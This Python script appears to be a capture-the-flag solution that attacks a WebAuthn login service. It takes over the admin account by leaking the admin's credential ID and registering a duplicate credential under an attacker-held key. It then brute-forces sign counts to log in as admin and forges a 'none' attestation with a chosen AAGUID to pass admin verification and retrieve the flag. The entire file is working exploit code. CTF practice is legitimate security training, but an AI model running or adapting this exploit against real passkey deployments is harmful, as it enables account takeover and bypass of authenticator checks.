import argparse
import base64
import hashlib
import json
import secrets
import urllib.parse

import cbor2
import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec

ADMIN_AAGUID = bytes.fromhex("c0ffee00cafebabedeadbeef12345678")


def b64u_enc(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64u_dec(data: str) -> bytes:
    return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))


def make_key() -> ec.EllipticCurvePrivateKey:
    return ec.generate_private_key(ec.SECP256R1())


def cose_key(pub: ec.EllipticCurvePublicKey) -> dict:
    numbers = pub.public_numbers()
    return {
        1: 2,
        3: -7,
        -1: 1,
        -2: numbers.x.to_bytes(32, "big"),
        -3: numbers.y.to_bytes(32, "big"),
    }


def make_registration_response(
    origin: str,
    rp_id: str,
    challenge: str,
    cred_id: bytes,
    aaguid: bytes,
):
    key = make_key()
    client_data = json.dumps(
        {
            "type": "webauthn.create",
            "challenge": challenge,
            "origin": origin,
            "crossOrigin": False,
        },
        separators=(",", ":"),
    ).encode()
    auth_data = (
        hashlib.sha256(rp_id.encode()).digest()
        + b"\x41"
        + (0).to_bytes(4, "big")
        + aaguid
        + len(cred_id).to_bytes(2, "big")
        + cred_id
        + cbor2.dumps(cose_key(key.public_key()))
    )
    attestation = {
        "fmt": "none",
        "attStmt": {},
        "authData": auth_data,
    }
    body = {
        "id": b64u_enc(cred_id),
        "rawId": b64u_enc(cred_id),
        "type": "public-key",
        "response": {
            "clientDataJSON": b64u_enc(client_data),
            "attestationObject": b64u_enc(cbor2.dumps(attestation)),
        },
    }
    return key, body


def make_assertion_response(
    key: ec.EllipticCurvePrivateKey,
    origin: str,
    rp_id: str,
    challenge: str,
    cred_id: bytes,
    user_handle: str,
    sign_count: int,
):
    client_data = json.dumps(
        {
            "type": "webauthn.get",
            "challenge": challenge,
            "origin": origin,
            "crossOrigin": False,
        },
        separators=(",", ":"),
    ).encode()
    auth_data = (
        hashlib.sha256(rp_id.encode()).digest()
        + b"\x01"
        + sign_count.to_bytes(4, "big")
    )
    signature = key.sign(
        auth_data + hashlib.sha256(client_data).digest(),
        ec.ECDSA(hashes.SHA256()),
    )
    return {
        "id": b64u_enc(cred_id),
        "rawId": b64u_enc(cred_id),
        "type": "public-key",
        "response": {
            "clientDataJSON": b64u_enc(client_data),
            "authenticatorData": b64u_enc(auth_data),
            "signature": b64u_enc(signature),
            "userHandle": user_handle,
        },
    }


def post_json(session: requests.Session, url: str, payload: dict):
    response = session.post(url, json=payload, timeout=10)
    response.raise_for_status()
    return response


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "base",
        nargs="?",
        default="https://physical-ctf.web.cpctf.space",
    )
    parser.add_argument("--tries", type=int, default=128)
    args = parser.parse_args()

    base = args.base.rstrip("/")
    origin = base
    rp_id = urllib.parse.urlparse(base).hostname
    if not rp_id:
        raise SystemExit("invalid target URL")

    leak_session = requests.Session()
    leak = post_json(
        leak_session,
        base + "/api/login/security-key/begin",
        {"username": "admin"},
    ).json()
    admin_cred_id = b64u_dec(leak["publicKey"]["allowCredentials"][0]["id"])

    register_session = requests.Session()
    username = "p" + secrets.token_hex(4)
    reg_begin = post_json(
        register_session,
        base + "/api/register/begin",
        {"username": username},
    ).json()["publicKey"]
    user_handle = reg_begin["user"]["id"]
    key, reg_finish_body = make_registration_response(
        origin,
        rp_id,
        reg_begin["challenge"],
        admin_cred_id,
        b"\x00" * 16,
    )
    post_json(register_session, base + "/api/register/finish", reg_finish_body)

    admin_session = requests.Session()
    for sign_count in range(1, args.tries + 1):
        login_begin = post_json(
            admin_session,
            base + "/api/login/security-key/begin",
            {"username": "admin"},
        ).json()
        login_finish_body = make_assertion_response(
            key,
            origin,
            rp_id,
            login_begin["publicKey"]["challenge"],
            admin_cred_id,
            user_handle,
            sign_count,
        )
        finish = admin_session.post(
            base + "/api/login/finish",
            json=login_finish_body,
            timeout=10,
        )
        me = admin_session.get(base + "/api/me", timeout=10)
        if finish.ok and me.ok:
            data = me.json()
            if data.get("username") == "admin" and data.get("isAdmin") is True:
                break
    else:
        raise SystemExit("failed to land on the attacker-owned duplicate credential")

    verify_begin = post_json(
        admin_session,
        base + "/api/admin/verify/begin",
        {},
    ).json()["publicKey"]
    _, verify_finish_body = make_registration_response(
        origin,
        rp_id,
        verify_begin["challenge"],
        secrets.token_bytes(32),
        ADMIN_AAGUID,
    )
    verify_finish = post_json(
        admin_session,
        base + "/api/admin/verify/finish",
        verify_finish_body,
    ).json()
    print(verify_finish["flag"])


if __name__ == "__main__":
    main()
